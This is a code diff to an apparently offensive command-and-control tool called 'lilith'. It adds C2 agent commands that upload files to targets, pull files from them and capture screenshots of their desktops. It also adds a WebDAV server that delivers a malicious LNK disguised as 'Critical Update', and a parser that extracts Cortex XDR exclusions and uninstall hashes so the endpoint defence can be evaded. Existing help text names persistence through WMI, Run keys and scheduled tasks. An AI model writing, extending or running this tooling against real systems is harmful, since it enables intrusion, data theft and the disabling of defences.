@@ -138,6 +138,7 @@ def cmd_build(args, cfg, ws):
             c2_jitter_max_ms  = cfg.get("c2_jitter_max_ms", 30000),
             # Task 13: domain fronting (optional — set front_host in engagement.yaml)
             front_host        = cfg.get("front_host"),
+            allow_vm          = cfg.get("allow_vm", True),
             keep_exe          = True,
         )
         if not ok:
@@ -708,6 +709,61 @@ def cmd_c2(args, cfg, ws):
             print(f"    Payload: downloads C2 agent stager → re-establishes session")
         return
 
+    # ── --upload LOCAL REMOTE: stage file on C2 then push upload task ─────────
+    if getattr(args, "upload", None):
+        import base64 as _b64, threading as _threading
+        local_path, remote_path = args.upload
+        if not os.path.exists(local_path):
+            print(f"[!] Local file not found: {local_path}")
+            return
+        lhost   = cfg.get("lhost", "10.10.14.1")
+        port    = cfg.get("http_port", 8443)
+        prefix  = cfg.get("url_prefix", "/cdn/static/v3")
+        fname   = os.path.basename(local_path)
+        staging_url = f"https://{lhost}:{port}{prefix}/{fname}"
+        dest_ws = ws.path(fname)
+        import shutil as _shutil
+        _shutil.copy2(local_path, dest_ws)
+        print(f"[*] Staged {local_path} → {dest_ws}")
+        print(f"[*] Agent will fetch: {staging_url}")
+        result = _push_and_wait(sid, f"upload {staging_url} {remote_path}")
+        if result is not None:
+            print(result)
+        return
+
+    # ── --download REMOTE [--out LOCAL]: pull file from target ────────────────
+    if getattr(args, "download", None):
+        import base64 as _b64
+        remote_path = args.download
+        out_path    = getattr(args, "out", None) or os.path.basename(remote_path)
+        result = _push_and_wait(sid, f"download {remote_path}")
+        if result is None:
+            return
+        if result.startswith("_BIN_B64:\n"):
+            raw = _b64.b64decode(result[10:])
+            with open(out_path, "wb") as _f:
+                _f.write(raw)
+            print(f"[+] Saved {len(raw):,} bytes → {out_path}")
+        else:
+            print(result)
+        return
+
+    # ── --screenshot [--out FILE]: capture desktop ─────────────────────────────
+    if getattr(args, "screenshot", False):
+        import base64 as _b64
+        out_path = getattr(args, "out", None) or "screenshot.bmp"
+        result = _push_and_wait(sid, "screenshot")
+        if result is None:
+            return
+        if result.startswith("_BIN_B64:\n"):
+            raw = _b64.b64decode(result[10:])
+            with open(out_path, "wb") as _f:
+                _f.write(raw)
+            print(f"[+] Saved {len(raw):,} bytes → {out_path}")
+        else:
+            print(result)
+        return
+
     # ── --cmd: one-shot command ────────────────────────────────────────────────
     if args.cmd:
         result = _push_and_wait(sid, args.cmd)
@@ -845,9 +901,33 @@ def cmd_network(args, cfg, ws):
             proxy_port = proxy_port,
         )
 
+    elif args.net_cmd == "webdav":
+        from network.webdav import run_webdav
+
+        lnk_path = args.lnk_path
+        if not lnk_path:
+            # auto-detect LNK from workspace (built by --smuggle)
+            lnk_path = os.path.join(ws.directory, "payload.lnk")
+        if not os.path.exists(lnk_path):
+            print(f"[!] LNK not found: {lnk_path}")
+            print(f"    Build one first: lilith build --smuggle")
+            sys.exit(1)
+
+        run_webdav(
+            lhost    = lhost,
+            lnk_path = lnk_path,
+            port     = args.webdav_port or cfg.get("webdav_port", 8080),
+            lnk_name = args.lnk_name or "Critical Update",
+        )
+
     else:
-        print("[!] Specify a network subcommand: captive | wpad")
+        print("[!] Specify a network subcommand: captive | wpad | webdav")
         sys.exit(1)
+
+
+def cmd_xdr(args, cfg, ws):
+    from builders.cortex_xdr import parse_and_report
+    parse_and_report(args.db_dir)
 
 
 def cmd_list(args, cfg, ws):
@@ -1029,8 +1109,16 @@ def main():
     c2_p.add_argument("--persist", metavar="TYPE", choices=["wmi", "run", "schtask"],
                       help="Install persistence: wmi (admin/SYSTEM, WMI subscription) | "
                            "run (user, HKCU Run key) | schtask (user, scheduled task at logon)")
-    c2_p.add_argument("--kill",    metavar="SID",
+    c2_p.add_argument("--kill",       metavar="SID",
                       help="Remove a session from the registry (use after migration to clean up old session)")
+    c2_p.add_argument("--upload",     metavar=("LOCAL", "REMOTE"), nargs=2,
+                      help="Stage LOCAL file on C2 server and push upload task to agent (writes to REMOTE path on target)")
+    c2_p.add_argument("--download",   metavar="REMOTE",
+                      help="Pull REMOTE file from target via agent (returns base64-decoded binary)")
+    c2_p.add_argument("--screenshot", action="store_true",
+                      help="Capture target desktop via GDI and save as BMP")
+    c2_p.add_argument("--out",        metavar="FILE",
+                      help="Output path for --download / --screenshot (default: basename or screenshot.bmp)")
 
     net_p     = sub.add_parser("network", help="Network-level delivery: captive portal, WPAD poisoning")
     net_sub   = net_p.add_subparsers(dest="net_cmd", metavar="mode")
@@ -1049,6 +1137,18 @@ def main():
     wpad_p.add_argument("--proxy-port", metavar="PORT", dest="proxy_port", type=int, default=8080,
                         help="Port for injecting HTTP proxy (default: 8080)")
 
+    webdav_p = net_sub.add_parser("webdav", help="WebDAV server for search-ms: LNK delivery")
+    webdav_p.add_argument("--lnk-path",    metavar="FILE", dest="lnk_path",    default=None,
+                          help="Path to .lnk payload file (default: <workspace>/payload.lnk)")
+    webdav_p.add_argument("--lnk-name",    metavar="NAME", dest="lnk_name",    default="Critical Update",
+                          help="Display name shown in Explorer search results (default: Critical Update)")
+    webdav_p.add_argument("--webdav-port", metavar="PORT", dest="webdav_port", type=int, default=None,
+                          help="HTTP port for WebDAV server (default: webdav_port from config, or 8080)")
+
+    xdr_p = sub.add_parser("xdr", help="Parse Cortex XDR agent_settings.db for exclusions and uninstall hash")
+    xdr_p.add_argument("--parse", metavar="DB_DIR", dest="db_dir", required=True,
+                       help="Path to agent_settings.db directory (e.g. pulled from target via 'download')")
+
     args = parser.parse_args()
     if not args.command:
         parser.print_help()
@@ -1066,6 +1166,7 @@ def main():
         "c2":      cmd_c2,
         "patch":   cmd_patch,
         "network": cmd_network,
+        "xdr":     cmd_xdr,
     }
     dispatch[args.command](args, cfg, ws)
 
